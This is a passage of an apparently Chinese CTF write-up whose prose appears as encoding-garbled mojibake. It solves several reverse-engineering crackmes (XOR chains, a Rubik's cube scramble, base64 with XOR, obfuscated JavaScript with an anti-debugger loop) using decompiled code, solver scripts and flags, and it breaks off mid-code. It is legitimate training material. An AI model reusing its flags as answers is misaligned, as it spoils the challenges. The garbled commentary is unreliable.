#evalå‡½æ•°ä¼šå°†å­—ç¬¦ä¸²å½¢å¼çš„æ–¹ç¨‹è½¬æ¢ä¸ºz3æ¨¡å—èƒ½è§£æçš„æ–¹ç¨‹ # æ±‚è§£å¹¶è½¬åŒ–ä¸ºå­—ç¬¦è¾“å‡ºï¼Œå¾—åˆ°flag if solver.check() == sat: # check()æ–¹æ³•ç”¨æ¥åˆ¤æ–­æ˜¯å¦æœ‰è§£ï¼Œsat(å³satisify)è¡¨ç¤ºæ»¡è¶³æœ‰è§£ ans = solver.model() # model()æ–¹æ³•å¾—åˆ°è§£ for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) # ä¸€èˆ¬ä¸ä¼šæ— è§£ï¼Œå¦‚æœæ— è§£å…«æˆæ˜¯æœªçŸ¥æ•°å˜é‡çš„ç±»å‹ä¸ç¬¦åˆï¼Œæˆ–çº¦æŸæ–¹ç¨‹æ·»åŠ é”™è¯¯ else: print(&quot;no ans!&quot;) if __name__ == &#x27;__main__&#x27;: # è®¾ç½®æ–¹ç¨‹ï¼Œè¯·ç”¨è„šæœ¬å°†æ¡ä»¶ä¸­çš„æ‰€æœ‰æ–¹ç¨‹å¤„ç†æˆåˆ—è¡¨ï¼Œç„¶åèµ‹å€¼ç»™fcåˆ—è¡¨ï¼ˆè¿™æ ·ä½ å°±ä¸ç”¨ä¸€ä¸ªä¸€ä¸ªæ–¹ç¨‹æ…¢æ…¢å»å¤åˆ¶äº†ï¼‰ fc = [] # åˆ›å»ºæœªçŸ¥æ•°å˜é‡ v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) æ ¹æ®é¢˜ç›®ä¿®æ”¹ä¸€ä¸‹ 12345678910111213141516171819202122232425from z3 import *with open(&#x27;tmp1.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()def solver_eng(fc): solver = Solver() for i in range(len(fc)): solver.add(eval(fc[i])) if solver.check() == sat: ans = solver.model() for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) else: print(&#x27;Error&#x27;)if __name__ == &#x27;__main__&#x27;: fc = [] for i in content: fc.append(i.strip()) v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) flag&#123;n0w_y0u_know_UPX!&#125; z3æ±‚è§£å™¨è„šæœ¬ï¼ˆCTF-reverseå¿…å¤‡ï¼‰_ctf z3-CSDNåšå®¢ call_above_callæ ¸å¿ƒä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// bad sp value at call has been detected, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-14h] [ebp-90h] int v5; // [esp-10h] [ebp-8Ch] int v6; // [esp-Ch] [ebp-88h] int v7; // [esp-8h] [ebp-84h] int v8; // [esp-4h] [ebp-80h] int v9; // [esp+0h] [ebp-7Ch] int v10; // [esp+4h] [ebp-78h] int i; // [esp+4h] [ebp-78h] int v12; // [esp+8h] [ebp-74h] char s[100]; // [esp+Ch] [ebp-70h] BYREF unsigned int v14; // [esp+70h] [ebp-Ch] int *p_argc; // [esp+74h] [ebp-8h] p_argc = &amp;argc; v14 = __readgsdword(0x14u); v12 = generate(); printf(&quot;input your key:&quot;); ((void (__stdcall *)(const char *, char *, int, int, int, int, int, int, int, int))__isoc99_scanf)( &quot;%s&quot;, s, v4, v5, v6, v7, v8, 1, v10, v12); if ( strlen(s) != 25 ) &#123; printf(&quot;Sorry!&quot;); exit(0); &#125; wuhuwuhu((int)s); for ( i = 0; i &lt;= 24; ++i ) &#123; if ( s[i] != *(_BYTE *)(enc + i) ) &#123; v9 = 0; break; &#125; &#125; if ( v9 ) printf(&quot;Congratulations!&quot;); else printf(&quot;try again!&quot;); end_m(p_argc); return 0;&#125; 12345678int __cdecl wuhuwuhu(int a1)&#123; int i; // [esp+8h] [ebp-Ch] for ( i = 0; i &lt;= 23; ++i ) *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + 1 + a1); return a1;&#125; ä¸»è¦é€»è¾‘ï¼šæ¥æ”¶è¾“å…¥ç„¶åå¾ªç¯å¼‚æˆ–è¾“å…¥ï¼ˆå…ƒç´ 1å’Œå…ƒç´ 2å¼‚æˆ–çš„ç»“æœæ›¿æ¢å…ƒç´ 1ï¼‰ï¼Œç„¶åå’Œç›®æ ‡æ•°ç»„æ¯”è¾ƒï¼Œä½†æ˜¯ç›®æ ‡æ•°ç»„æ˜¯åŠ¨æ€çš„ï¼Œå› æ­¤éœ€è¦åŠ¨æ€è°ƒè¯•æ‹¿åˆ°ç›®æ ‡æ•°ç»„ååè¿‡æ¥å¼‚æˆ–å°±å¯ä»¥äº† exp 1234567s = [0x0A, 0x0D, 0x06, 0x1C, 0x4B, 0x49, 0x17, 0x5A, 0x59, 0x04, 0x0A, 0x3C, 0x3B, 0x57, 0x51, 0x17, 0x12, 0x38, 0x26, 0x00, 0x1D, 0x17, 0x52, 0x5C, 0x7D]for i in range(len(s)): s[len(s)-2-i] = s[len(s)-2-i] ^ s[len(s)-1-i]for i in s: print(chr(i), end=&#x27;&#x27;) flag&#123;0yn4mic_d3bug_yyds!&#125; cube3é¢˜ç›®æè¿° ä½ ç©è¿‡ä¸‰é˜¶é­”æ–¹å—,ä½ èƒ½çœ‹æ‡‚R U Râ€™ Uâ€™è¿™æ ·çš„å…¬å¼å—,è¿™é‡Œæœ‰4ä¸ªé­”æ–¹ç­‰ä½ æ¥è¿˜åŸ å…¬å¼(æ­¥éª¤)æ ¼å¼ä¾‹å¦‚R Uâ€™ R U R U R Uâ€™ Râ€™ Uâ€™ R2â€™ &lt;å›è½¦&gt;,æ¯æ­¥æ“ä½œç”¨ç©ºæ ¼åˆ†å¼€,é€†æ—¶é’ˆåŠ ä¸Šâ€™å­—ç¬¦ flagæ ¼å¼ä¸ºxsctf{formula},å…¶ä¸­formulaä¸º4ä¸ªé­”æ–¹çš„è¿˜åŸæ­¥éª¤ä¾æ¬¡è¿åœ¨ä¸€èµ·,å»æ‰ç©ºæ ¼,å–å…¶md5 æœ¬é¢˜åœ¨Ubuntu22ä¸‹ç¼–è¯‘,è¯·ä¸è¦ä½¿ç”¨ubuntu18 6ä¸ªé¢ï¼Œä¸€å…±24ç§æ—‹è½¬æ“ä½œï¼Œåˆ†ææ—¶éœ€è¦å¯¹å·å…¥åº§ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+Bh] [rbp-3B5h] int v5; // [rsp+Ch] [rbp-3B4h] char v6[160]; // [rsp+10h] [rbp-3B0h] BYREF int v7[40]; // [rsp+B0h] [rbp-310h] BYREF char v8[160]; // [rsp+150h] [rbp-270h] BYREF int v9[114]; // [rsp+1F0h] [rbp-1D0h] BYREF unsigned __int64 v10; // [rsp+3B8h] [rbp-8h] v10 = __readfsqword(0x28u); cube_init((__int64)v9); print_menu(v9, argv); v4 = getchar(); getchar(); if ( v4 &lt;= &#x27;0&#x27; || v4 &gt; 52 ) &#123; if ( v4 == 53 ) puts(&quot;bye!&quot;); else puts(&quot;error!&quot;); &#125; else &#123; formula_get_by_id((__int64)v6, v4 - 48); cube_scramble((__int64)v9, (__int64)v6); cube_print((unsigned int *)v9); v5 = 0; formula_input((char *)v7); while ( v7[v5] != 24 ) cube_rotating((__int64)v9, v7[v5++]); cube_print((unsigned int *)v9); formula_reverse(v7, v8); if ( !(unsigned int)cube_isorigin(v9) || (unsigned int)formula_cmp(v6, v8) ) &#123; if ( (unsigned int)cube_isorigin(v9) &amp;&amp; (unsigned int)formula_cmp(v6, v8) ) puts(&quot;Restore successfully!!!But not reverse!!!&quot;); else puts(&quot;Restore failed!!!&quot;); &#125; else &#123; puts(&quot;Restore successfully!!!You reversed the formula!!!&quot;); &#125; &#125; printf(&quot;press anykey to continue...&quot;); getchar(); return 0;&#125; è¿è¡Œæ˜¯è¿™æ ·çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041~$ .&#x2F;cube3 ä¸‰é˜¶é­”æ–¹ _______________________________________________ | | | è¯·è¾“å…¥ç¼–å·: | | 1.æ‰“ä¹±1 2.æ‰“ä¹±2 | | 3.æ‰“ä¹±3 4.æ‰“ä¹±4 | | 5.é€€å‡ºç¨‹åº | | | | | ----------------------------------------------- è¯·è¾“å…¥ç¼–å·[1&#x2F;2]:4 ________________ | 2 | 3 | 3 | +----+----+----+ | 2 | 4 | 4 | +----+----+----+ | 5 | 3 | 6 | +----+----+----+ &#x2F; 4 &#x2F; 5 &#x2F; 1 &#x2F;| &#x2F;____&#x2F;____&#x2F;____&#x2F; | &#x2F; 1 &#x2F; 1 &#x2F; 6 &#x2F;|3+ &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;| &#x2F; 3 &#x2F; 5 &#x2F; 1 &#x2F;|1|1| ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;| | 1 | 5 | 5 | 2 | 4 | 6 |&#x2F;|6+1| +---+----+----+----+----+----+6|&#x2F;|&#x2F; | 5 | 5 | 2 | 6 | 3 | 3 |&#x2F;|6+ +---+----+----+----+----+----+2|&#x2F; | 6 | 2 | 3 | 6 | 3 | 5 |&#x2F; +---+----+----+----+----+----+ | 2 | 1 | 4 | +----+----+----+ | 4 | 2 | 4 | +----+----+----+ | 4 | 2 | 5 | +----+----+----+Enter a formula and separate each step with a spaceTip: The format of the operation is like R2 R2&#39; R[&#39;] represents a counterclockwise rotation&gt;&gt;&gt; éœ€è¦è¾“å…¥é­”æ–¹çš„å…¬å¼ã€åˆçº§ç¯‡ã€‘ä¸‰é˜¶é­”æ–¹å…¥é—¨æ•™ç¨‹ - çŸ¥ä¹ (zhihu.com) è¦è¿˜åŸé­”æ–¹ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯åç€æ‹§è¦åç€æ‹§ï¼Œå°±è¦æ‰¾åˆ°æ‰“ä¹±çš„é¡ºåº idaå¤§éƒ¨åˆ†å‡½æ•°çœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼Œå¯ä»¥å‡­æ„Ÿè§‰æ‰¾åˆ°å­˜å‚¨æ‰“ä¹±é¡ºåºçš„å˜é‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596unsigned __int64 __fastcall formula_get_by_id(__int64 a1, int a2)&#123; int i; // [rsp+1Ch] [rbp-294h] int v4[162]; // [rsp+20h] [rbp-290h] BYREF unsigned __int64 v5; // [rsp+2A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(v4, 0, 0x280uLL); v4[0] = 23; v4[1] = 3; v4[2] = 4; v4[3] = 8; v4[4] = 18; v4[5] = 9; v4[6] = 12; v4[7] = 18; v4[8] = 13; v4[9] = 7; v4[10] = 20; v4[11] = 11; v4[12] = 13; v4[13] = 22; v4[14] = 14; v4[15] = 6; v4[16] = 8; v4[17] = 18; v4[18] = 4; v4[19] = 14; v4[20] = 24; v4[40] = 6; v4[41] = 22; v4[42] = 7; v4[43] = 13; v4[44] = 1; v4[45] = 4; v4[46] = 2; v4[47] = 8; v4[48] = 22; v4[49] = 19; v4[50] = 6; v4[51] = 10; v4[52] = 19; v4[53] = 21; v4[54] = 19; v4[55] = 7; v4[56] = 17; v4[57] = 8; v4[58] = 7; v4[59] = 12; v4[60] = 24; v4[80] = 5; v4[81] = 15; v4[82] = 19; v4[83] = 2; v4[84] = 5; v4[85] = 17; v4[86] = 12; v4[87] = 9; v4[88] = 7; v4[89] = 12; v4[90] = 18; v4[91] = 5; v4[92] = 12; v4[93] = 3; v4[94] = 11; v4[95] = 14; v4[96] = 5; v4[97] = 18; v4[98] = 6; v4[99] = 22; v4[100] = 24; v4[120] = 20; v4[121] = 12; v4[122] = 7; v4[123] = 21; v4[124] = 14; v4[125] = 23; v4[126] = 19; v4[127] = 13; v4[128] = 3; v4[129] = 18; v4[130] = 7; v4[131] = 3; v4[132] = 0x16; v4[134] = 8; v4[135] = 1; v4[136] = 0x12; v4[137] = 7; v4[138] = 0x12; v4[139] = 0xB; v4[140] = 0x18; for ( i = 0; v4[40 * a2 - 40 + i] != 24; ++i ) *(_DWORD *)(a1 + 4LL * i) = v4[40 * a2 - 40 + i]; *(_DWORD *)(4LL * i + a1) = 24; return v5 - __readfsqword(0x28u);&#125; å› ä¸ºé¢˜ç›®è¯´ä¸€å…±æœ‰24ç§æ“ä½œï¼Œåˆšå¥½æ˜¯v4å…ƒç´ çš„å–å€¼èŒƒå›´-1å‡ä¸€çš„åŸå› æ˜¯å› ä¸ºæœ‰å››ä¸ªé­”æ–¹ï¼Œæœ€å¤§çš„å…ƒç´ ï¼ˆ24ï¼‰çš„ä½œç”¨ç±»ä¼¼åˆ†éš”ç¬¦ï¼Œé€šè¿‡ä¸»å‡½æ•°çš„whileè¯­å¥ä¹Ÿå¯ä»¥åˆ¤æ–­å‡ºæ¥ï¼Œè€Œä¸”æ•´ä¸ªv4æ•°ç»„åˆšå¥½è¢«å€¼ä¸º24çš„å…ƒç´ åˆ†éš”æˆ4éƒ¨åˆ†ï¼Œåˆšå¥½å¯¹åº”4ä¸ªé­”æ–¹ å› æ­¤å¯ä»¥å°†è¿™äº›å…ƒç´ æå–å‡ºæ¥ï¼ˆæœ‰å‘ï¼‰ï¼Œç„¶åæ˜ å°„åˆ°å¯¹åº”çš„å…¬å¼ï¼Œå†åç€è¾“å‡ºå°±è¡Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849s = open(&#x27;./tmp.txt&#x27;, &#x27;r&#x27;).readlines()print(len(s))ss = []for i in s: num = &#x27;&#x27; for j in range(len(i)): if i[j] == &#x27;=&#x27;: num = i[j+1:-2] ss.append(int(num))rotate = [ &#x27;U&#x27;, &#x27;U\\&#x27;&#x27;, &#x27;U2&#x27;, &#x27;U2\\&#x27;&#x27;, &#x27;D&#x27;, &#x27;D\\&#x27;&#x27;, &#x27;D2&#x27;, &#x27;D2\\&#x27;&#x27;, &#x27;F&#x27;, &#x27;F\\&#x27;&#x27;, &#x27;F2&#x27;, &#x27;F2\\&#x27;&#x27;, &#x27;B&#x27;, &#x27;B\\&#x27;&#x27;, &#x27;B2&#x27;, &#x27;B2\\&#x27;&#x27;, &#x27;L&#x27;, &#x27;L\\&#x27;&#x27;, &#x27;L2&#x27;, &#x27;L2\\&#x27;&#x27;, &#x27;R&#x27;, &#x27;R\\&#x27;&#x27;, &#x27;R2&#x27;, &#x27;R2\\&#x27;&#x27;]for i in ss: if i == 24: print() else: print(rotate[i], end=&#x27; &#x27;)for i in range(len(ss)-1, -1, -1): if ss[i] == 24: print() else: if &#x27;\\&#x27;&#x27; in rotate[ss[i]]: print(rotate[ss[i]-1], end=&#x27; &#x27;) else: print(rotate[ss[i]+1], end=&#x27; &#x27;)print()sss = &#x27;&#x27;&#x27;B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 DF2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;&#x27;&#x27;&#x27;ssss = &#x27;&#x27;for i in sss: if i != &#x27; &#x27; and i != &#x27;\\n&#x27;: ssss += iprint(ssss) è¿™æ ·å°±å¯ä»¥å¾—åˆ°å››ä¸ªé­”æ–¹çš„è§£æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç¨‹åºéªŒè¯ï¼Œæœ€åå†å°†è§£æ³•æŒ‰ç…§é¢˜ç›®è¦æ±‚å¤„ç†å°±è¡Œ xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125; å‘ v4æ•°ç»„çš„å®šä¹‰ç§å°‘äº†ä¸€ä¸ªå…ƒç´ v4[133]ï¼Œéœ€è¦åŠ¨æ€è°ƒè¯•å¾—åˆ°è¿™ä¸ªå…ƒç´ çš„å€¼ å› ä¸ºæ˜¯4ä¸ªé­”æ–¹ä¸€èµ·åç€è¾“å‡ºï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªé­”æ–¹çš„è§£æ³•åº”è¯¥å¯¹åº”ç¬¬å››è¡Œçš„è¾“å‡º æœ€åä¸²èµ·æ¥çš„æ—¶å€™æ˜¯ç¬¬ä¸€ä¸ªé­”æ–¹çš„è§£æ³•+ç¬¬äºŒä¸ªé­”æ–¹çš„è§£æ³•...ï¼Œå³ç¬¬å››è¡Œ+ç¬¬ä¸‰è¡Œ+â€¦ easy_xoræ ¸å¿ƒä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char v4; // al int v5; // eax char v7; // [rsp+33h] [rbp-Dh] char v8; // [rsp+33h] [rbp-Dh] int v9; // [rsp+34h] [rbp-Ch] int i; // [rsp+38h] [rbp-8h] int v11; // [rsp+3Ch] [rbp-4h] _main(); v11 = 0; v9 = 0; puts(&quot;Please input your flag:&quot;); while ( 1 ) &#123; v8 = getchar(); if ( v8 == 10 ) break; v7 = key[v9 % 4] ^ v8; while ( 1 ) &#123; v4 = v7--; if ( v4 &lt;= 0 ) break; v3 = v11++; s[v3] = 1; &#125; v5 = v11++; s[v5] = 0; ++v9; &#125; while ( v11 &lt;= 2559 ) s[v11++] = -1; for ( i = 0; i &lt;= 2559; ++i ) &#123; if ( r[i] != s[i] ) &#123; puts(&quot;Lose lose lose!&quot;); break; &#125; &#125; if ( i == 2560 ) puts(&quot;Win win win!&quot;); system(&quot;pause&quot;); return 0;&#125; å…¶ä¸­æ•°ç»„ræ˜¯åœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨åŠ¨æ€è°ƒè¯• å¤§æ¦‚çš„é€»è¾‘æ˜¯ï¼š æ¥æ”¶è¾“å…¥ç›´åˆ°å›è½¦ç¬¦ è®¡ç®—æ¯ä¸ªå­—ç¬¦å¼‚æˆ–çš„ç»“æœ å¼‚æˆ–çš„ç»“æœæ˜¯å¤šå°‘ï¼Œå°±åœ¨æ•°ç»„ä¸­æ·»åŠ å¤šå°‘ä¸ª1ï¼Œç„¶åæ·»åŠ ä¸€ä¸ª0 å¯¹æ¯”ä¸¤ä¸ªæ•°ç»„çš„å·®å¼‚ å› æ­¤è§£å¯†çš„é€»è¾‘å°±æ˜¯ æ‹¿åˆ°ç›®æ ‡æ•°ç»„ éå†æ•°ç»„ä¸­1çš„ä¸ªæ•°ï¼Œç›´åˆ°é‡åˆ°æ•°å­—0 å°†ä»¥ä¸Š1çš„ä¸ªæ•°å¾ªç¯å¼‚æˆ–keyçš„å…ƒç´  è½¬æ¢ä¸ºå­—ç¬¦è¾“å‡º é‡å¤2åˆ°4ï¼Œç›´åˆ°é‡åˆ°-1 exp.py 1234567891011121314151617s = [...]ch = []key_index = 0key = &#x27;SCNU&#x27;c = 0for i in s: if i == 1: c += 1 elif i == 0: # print(hex(c), end=&#x27;&#x27;) ch.append(chr(c^ord(key[key_index%4]))) key_index += 1 c = 0 else: breakprint(&#x27;&#x27;.join(ch)) flag&#123;Winn3r_n0t_L0s3r_#&#125; eazy_64x123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-98h] int v5; // [rsp+Ch] [rbp-94h] int i; // [rsp+10h] [rbp-90h] int v7; // [rsp+14h] [rbp-8Ch] int v8; // [rsp+1Ch] [rbp-84h] char *v9; // [rsp+20h] [rbp-80h] char dest[4]; // [rsp+2Ch] [rbp-74h] BYREF char s[104]; // [rsp+30h] [rbp-70h] BYREF unsigned __int64 v12; // [rsp+98h] [rbp-8h] v12 = __readfsqword(0x28u); memset(s, 0, 0x64uLL); __isoc99_scanf(&amp;unk_222C, s); v7 = strlen(s); if ( v7 == 20 ) &#123; v4 = 0; v5 = 0; while ( v7 / 3 &gt;= v4 ) &#123; memset(dest, 0, sizeof(dest)); memcpy(dest, &amp;s[v5], 3uLL); v9 = encrypt(dest); v8 = strlen(v9); get_trans(v9); for ( i = 0; i &lt; v8; ++i ) &#123; if ( v9[i] != glob[4 * v4 + i] ) &#123; puts(&quot;Oh,no!&quot;); return 0; &#125; &#125; free(v9); ++v4; v5 += 3; &#125; printf(&quot;Good!&quot;); return 0; &#125; else &#123; printf(&quot;sorry!&quot;); return 0; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041_BYTE *__fastcall encrypt(const char *a1)&#123; int v2; // [rsp+10h] [rbp-70h] int v3; // [rsp+14h] [rbp-6Ch] __int64 v4; // [rsp+18h] [rbp-68h] signed __int64 v5; // [rsp+20h] [rbp-60h] _BYTE *v6; // [rsp+28h] [rbp-58h] char v7[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(v7, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); v5 = strlen(a1); if ( v5 % 3 ) v4 = 4 * (v5 / 3 + 1); else v4 = 4 * (v5 / 3); v6 = malloc(v4 + 1); v6[v4] = 0; v2 = 0; v3 = 0; while ( v2 &lt; v4 - 2 ) &#123; v6[v2] = v7[(unsigned __int8)a1[v3] &gt;&gt; 2]; v6[v2 + 1] = v7[((unsigned __int8)a1[v3 + 1] &gt;&gt; 4) | (16 * a1[v3]) &amp; &#x27;0&#x27;]; v6[v2 + 2] = v7[((unsigned __int8)a1[v3 + 2] &gt;&gt; 6) | (4 * a1[v3 + 1]) &amp; 0x3C]; v6[v2 + 3] = v7[a1[v3 + 2] &amp; 0x3F]; v3 += 3; v2 += 4; &#125; if ( v5 % 3 == 1 ) &#123; v6[v2 - 2] = 61; v6[v2 - 1] = 61; &#125; else if ( v5 % 3 == 2 ) &#123; v6[v2 - 1] = 61; &#125; return v6;&#125; çœ‹åˆ°è¿™é‡Œè§‰å¾—æ˜¯base64ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ¢è¡¨base64ï¼Œä½†æ˜¯è§£ä¸å‡ºæ¥ï¼Œæ¥ç€çœ‹ 1234567891011121314size_t __fastcall get_trans(const char *a1)&#123; size_t result; // rax int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; ; ++i ) &#123; result = strlen(a1); if ( i &gt;= result ) break; a1[i] ^= 0x68u; &#125; return result;&#125; åœ¨ç±»ä¼¼baseç¼–ç ä¹‹åè¿˜åŠ äº†å¼‚æˆ– æ€è·¯ï¼š å¼‚æˆ–è¿˜åŸ base64 exp 123456789import base64s = [0x32, 0x05, 0x10, 0x00, 0x32, 0x5B, 0x1B, 0x10, 0x30, 0x5A, 0x1F, 0x1F, 0x0C, 0x05, 0x3E, 0x0E, 0x0B, 0x05, 0x3E, 0x5A, 0x32, 0x3C, 0x21, 0x59, 0x32, 0x30, 0x58, 0x55]ss = &#x27;&#x27;for i in s: ss += chr(i^0x68) print(base64.b64decode(ss)) flag&#123;1_l0ve_reve25e&#125; JSNEWNEWä¸€ä¸ªhtmlå†…åµŒç»è¿‡æ··æ·†çš„jsä»£ç  1((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());function _Y0u(_0x5093c8,_0x291ad5)&#123;return _0x5093c8+_0x291ad5&#125;function _C4n(_0x4277b8)&#123;return _0x4277b8&amp;0xff&#125;function _N3v3r(_0x414184,_0x29df09)&#123;return _C4n(_0x414184^_0x29df09)&#125;function _G37(_0x500f65,_0x1ddb85)&#123;return _C4n(_0x500f65|_0x1ddb85)&#125;function _Th15(_0x1621d6,_0x285fc7)&#123;return _C4n(_0x1621d6&amp;_0x285fc7)&#125;function _H4(_0x2abb65)&#123;return _C4n(~_0x2abb65)&#125;function _H4H4(_0x5b22bc)&#123;return _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],0x1)))&#125;function _H4H4H4(_0x431cb1,_0x516603)&#123;return _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;function _H4H4H4H4(_0x1b81b8,_0x11e8ab,_0x2c730f)&#123;return a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;function _G00D(_0x51eb06)&#123;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());var _0x8b9e29=document[&#x27;getElementById&#x27;](&#x27;passwordError&#x27;);_0xcaf3caf3=[],_0xc4f3c4f3=[0x55,0xbf,0x63,0xbc,0x33,0x95,0x31,0x4c,0x89,0x6b,0x49,0x31,0x30,0xdf,0x63,0xe5,0x57,0xd7,0x73,0xa6,0x6e,0xd3,0x63,0xa1,0x92,0x5b,0x72,0xe6,0x8f,0x76,0x4f,0xd0],Hur1k=&#x27;Hur1k&#x27;;if(_0x51eb06[&#x27;length&#x27;]!=0x27)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;é”™è¯¯çš„&#x27;,![];if(_0x51eb06[&#x27;substr&#x27;](0x0,0x6)!=&#x27;XSCTF&#123;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;é”™è¯¯çš„&#x27;,![];if(_0x51eb06[0x26]!=&#x27;&#125;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;é”™è¯¯çš„&#x27;,![];_0x114514=_0x51eb06[&#x27;substr&#x27;](0x6,0x20),_0x51eb06=[];for(var _0x28db6c=0x0;_0x28db6c&lt;_0x114514[&#x27;length&#x27;];_0x28db6c++)&#123;_0x51eb06[&#x27;push&#x27;](_0x114514[&#x27;charCodeAt&#x27;](_0x28db6c))&#125;Math[&#x27;seed&#x27;]=new Date()[&#x27;getTime&#x27;](),Math[&#x27;seededRandom&#x27;]=function(_0x14b0c9,_0x56fb11)&#123;_0x56fb11=_0x56fb11||0x1,_0x14b0c9=_0x14b0c9||0x0,Math[&#x27;seed&#x27;]=(Math[&#x27;seed&#x27;]*0x2455+0xc091)%0x38f40;var _0xee8b23=Math[&#x27;seed&#x27;]/0x38f40;return parseInt(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;var _0xe5731c=Math[&#x27;seededRandom&#x27;](0x0,0x100);for(var _0x28db6c=0x0;_0x28db6c&lt;_0x51eb06[&#x27;length&#x27;];_0x28db6c+=0x2)&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[&#x27;push&#x27;](tmp),randNum=Math[&#x27;seededRandom&#x27;](0x0,0x100),Math[&#x27;seed&#x27;]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+0x1],Hur1k[&#x27;charCodeAt&#x27;]([_0x28db6c/0x2%Hur1k[&#x27;length&#x27;]]),randNum),_0xcaf3caf3[&#x27;push&#x27;](tmp)&#125;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());if(_0xcaf3caf3[&#x27;length&#x27;]!=0x20)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;ç©¶æé”™è¯¯çš„&#x27;,![];for(var _0x28db6c=0x0;_0x28db6c&lt;_0xcaf3caf3[&#x27;length&#x27;];_0x28db6c++)&#123;if(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;é”™è¯¯çš„&#x27;,![]&#125;return!![]&#125; é¦–å…ˆç»è¿‡Obfuscator.io Deobfuscator (deobfuscate.io)ï¼Œåˆæ­¥è§£æ··æ·†å†é€šè¿‡JavaScript Deobfuscator (deobfuscate.io)ï¼Œå†è§£ä¸€æ¬¡ç„¶åå°±è§£ä¸åŠ¨äº†ï¼ˆä¸æ’é™¤æœ‰å…¶ä»–å·¥å…·ï¼‰ è§£æ··æ·†çš„ç»“æœ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function _H4H4H4(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 